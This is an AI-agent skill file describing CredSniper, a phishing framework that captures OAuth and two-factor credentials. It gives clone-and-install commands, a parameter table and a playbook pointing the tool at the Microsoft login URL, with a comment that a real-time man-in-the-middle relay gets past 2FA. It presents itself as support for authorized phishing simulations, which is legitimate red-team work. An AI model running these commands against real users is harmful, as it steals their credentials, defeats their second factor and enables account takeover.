---
name: credsniper-phish
description: "CredSniper: Phishes OAuth and 2FA credentials. Signals: phishing, social engineering, SSL."
zh-signals: "CredSniper: OAuth/2FA 钓鱼。信号:钓鱼,社会工程,SSL。"
when-to-use: >-
  Use when running an authorized phishing simulation that must capture
  credentials and relay or bypass 2FA. Supports SSL and mimics a target login
  URL.
---

# CredSniper

- Attack Category: C08 Phishing and Social Engineering
- Upstream Repository: https://github.com/ustayready/CredSniper
- Upstream License: Apache-2.0 (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)

## Installation

```bash
git clone https://github.com/ustayready/CredSniper && cd CredSniper && pip install -r requirements.txt
```

## Parameter Quick Reference

| Parameter / Command | Description |
| --- | --- |
| `python3 credsniper.py --url https://login.microsoftonline.com -p 8443` | 2FA phishing |
| `--url u -p port -s` | SSL |
| `-o out.txt` | Output |

## Attack Scenario Playbook

### OAuth/2FA Phishing

```bash
python3 credsniper.py --url https://login.microsoftonline.com
# man-in-the-middle relays in real time to pass 2FA
```

## Notes

A phishing framework with 2FA support.
